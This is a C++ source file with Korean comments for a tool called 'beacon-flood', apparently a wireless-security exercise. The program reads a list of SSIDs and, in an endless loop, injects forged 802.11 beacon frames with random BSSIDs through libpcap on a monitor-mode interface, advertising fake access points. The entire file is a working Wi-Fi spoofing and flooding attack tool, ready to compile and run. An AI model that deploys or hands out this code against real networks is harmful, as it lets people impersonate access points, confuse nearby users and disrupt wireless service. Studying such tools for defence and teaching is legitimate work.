#include <iostream>
#include <fstream>
#include <vector>
#include <string>
#include <cstdint>
#include <cstdlib>
#include <ctime>
#include <pcap.h>
#include <cstring>
#include <unistd.h> // sleep
#include "MacAddr.h"
#include "Dot11.h"

/*
 * beacon-flood <interface> <ssid-list-file>
 * 예: beacon-flood mon0 ssid-list.txt
 *
 * 1. <ssid-list-file>에서 SSID 목록을 읽어온다.
 * 2. 일정 간격으로 각 SSID에 대한 Beacon 프레임을 만든 뒤 계속 전송한다.
 * 3. Radiotap Header + 802.11 Beacon Frame + Fixed Param(12byte) + SSID Tag + 기타 태그...
 */

#pragma pack(push, 1)
// 간단 버전 Radiotap 헤더(고정 길이 8~14 바이트 예시)
struct RadiotapHdr {
    uint8_t  revision = 0;
    uint8_t  pad = 0;
    uint16_t length = 0;       // 전체 radiotap 길이
    uint32_t presentFlags = 0; // 어떤 필드들이 있는지 bitmask
};

// Beacon Fixed Params
struct BeaconFixed {
    uint64_t timestamp;
    uint16_t beaconInterval;
    uint16_t capInfo;
};

// Tagged Param Header
struct TagHdr {
    uint8_t tagNumber;
    uint8_t tagLength;
};
#pragma pack(pop)

// 랜덤 BSSID 만드는 헬퍼(원하면 매번 다른 BSSID로 뿌림)
static void generateRandomMac(uint8_t mac[6]) {
    // 예: 00:11:22:xx:xx:xx (앞 3바이트는 고정, 뒤 3바이트 랜덤)
    mac[0] = 0x00;
    mac[1] = 0x11;
    mac[2] = 0x22;
    mac[3] = rand() & 0xFF;
    mac[4] = rand() & 0xFF;
    mac[5] = rand() & 0xFF;
}

// Beacon frame 하나를 만들어 packetBuf에 담고, packetLen에 길이 설정
static bool buildBeaconFrame(
    const std::string& ssid,
    uint8_t packetBuf[], 
    int& packetLen)
{
    // 1. Radiotap Header (간단 버전: 8바이트)
    RadiotapHdr* rth = reinterpret_cast<RadiotapHdr*>(packetBuf);
    rth->revision = 0;
    rth->pad = 0;
    rth->length = sizeof(RadiotapHdr); // 8
    rth->presentFlags = 0;            // 아무 정보 없음
    int offset = sizeof(RadiotapHdr); // 8

    // 2. 802.11 MAC Header (24바이트: Dot11Hdr)
    Dot11Hdr* dot11 = reinterpret_cast<Dot11Hdr*>(packetBuf + offset);
    memset(dot11, 0, sizeof(Dot11Hdr));

    // frameControl: type=0 mgmt, subtype=8 beacon
    // ex) 0x80 = 1000 0000
    dot11->frameControl = 0x0080;  // 리틀엔디안 -> 실제는 0x80 0x00
    dot11->duration = 0;  // 보통 0
    // addr1 = broadcast
    memset(dot11->addr1, 0xFF, 6);

    // addr2, addr3 = 동일한 랜덤 BSSID(=fake AP)
    generateRandomMac(dot11->addr2);
    memcpy(dot11->addr3, dot11->addr2, 6);

    dot11->seqCtrl = 0; // sequence num=0

    offset += sizeof(Dot11Hdr); // +24 => now 8+24 = 32

    // 3. Beacon Fixed Params(12바이트)
    BeaconFixed* bf = reinterpret_cast<BeaconFixed*>(packetBuf + offset);
    bf->timestamp = 0;        // 임의
    bf->beaconInterval = 0x0064; // 0x64 = 100(TU)
    bf->capInfo = 0x0431;     // ESS(1), Privacy(0), etc. (간단 예시)
    offset += sizeof(BeaconFixed);

    // 4. Tagged Params
    //    (a) SSID Tag
    {
        TagHdr* tag = reinterpret_cast<TagHdr*>(packetBuf + offset);
        tag->tagNumber = 0; // SSID
        tag->tagLength = ssid.size();
        offset += sizeof(TagHdr);

        // SSID 문자열 복사
        memcpy(packetBuf + offset, ssid.data(), ssid.size());
        offset += ssid.size();
    }
    //    (b) Supported Rates Tag (optional)
    {
        TagHdr* tag = reinterpret_cast<TagHdr*>(packetBuf + offset);
        tag->tagNumber = 1; // Supported Rates
        tag->tagLength = 1; // 간단히 1바이트
        offset += sizeof(TagHdr);
        // ex) 0x82 (1 Mbps), 0x84 (2 Mbps), etc.
        packetBuf[offset] = 0x82; 
        offset += 1;
    }
    //    (c) DS Parameter Set (채널 1)
    {
        TagHdr* tag = reinterpret_cast<TagHdr*>(packetBuf + offset);
        tag->tagNumber = 3; // DS Parameter
        tag->tagLength = 1; // 채널번호 1
        offset += sizeof(TagHdr);
        packetBuf[offset] = 1; // ch 1
        offset += 1;
    }

    packetLen = offset; // 최종 길이
    // 주의: RadiotapHdr.length 필드를 업데이트 해줄 수도 있음(필요시)
    // rth->length = offset <= 0xFFFF ? offset : ...
    return true;
}

int main(int argc, char* argv[]) {
    if (argc != 3) {
        std::cout << "syntax : beacon-flood <interface> <ssid-list-file>\n"
                  << "sample : beacon-flood mon0 ssid-list.txt\n";
        return -1;
    }

    srand((unsigned)time(nullptr)); // 랜덤 시드

    std::string interface = argv[1];
    std::string ssidFile  = argv[2];

    // SSID 리스트 로드
    std::ifstream ifs(ssidFile);
    if (!ifs.is_open()) {
        std::cerr << "[!] Cannot open SSID list file: " << ssidFile << "\n";
        return -1;
    }

    std::vector<std::string> ssidList;
    {
        std::string line;
        while (std::getline(ifs, line)) {
            if (!line.empty()) {
                ssidList.push_back(line);
            }
        }
        ifs.close();
    }

    if (ssidList.empty()) {
        std::cerr << "[!] No SSID found in file\n";
        return -1;
    }

    // pcap 열기 (monitor mode에서 열려있다고 가정)
    char errbuf[PCAP_ERRBUF_SIZE];
    pcap_t* handle = pcap_open_live(interface.c_str(), BUFSIZ, 1, 1000, errbuf);
    if (handle == nullptr) {
        std::cerr << "[!] pcap_open_live(" << interface << ") failed: " << errbuf << std::endl;
        return -1;
    }

    std::cout << "[*] Starting Beacon Flood on interface: " << interface << "\n";
    std::cout << "[*] SSID Count: " << ssidList.size() << "\n";

    // 메인 루프
    // SSID들을 순회하며 Beacon 프레임을 만들어 전송
    // 여기선 무한 반복(CTRL+C 등으로 종료)
    while (true) {
        for (auto& ssid : ssidList) {
            // 1. Beacon Packet 생성
            static uint8_t packetBuf[256];
            int packetLen = 0;
            if (!buildBeaconFrame(ssid, packetBuf, packetLen)) {
                continue;
            }

            // 2. 전송
            if (pcap_sendpacket(handle, packetBuf, packetLen) != 0) {
                std::cerr << "[!] pcap_sendpacket error: " << pcap_geterr(handle) << "\n";
            }

            // SSID 여러 개면 너무 빠르게 뿌리지 않도록 조금 쉼
            usleep(10000); // 10ms
        }

        // 라운드 한 번 끝났으니 약간 쉬기(예: 100ms)
        usleep(100000);
    }

    pcap_close(handle);
    return 0;
}
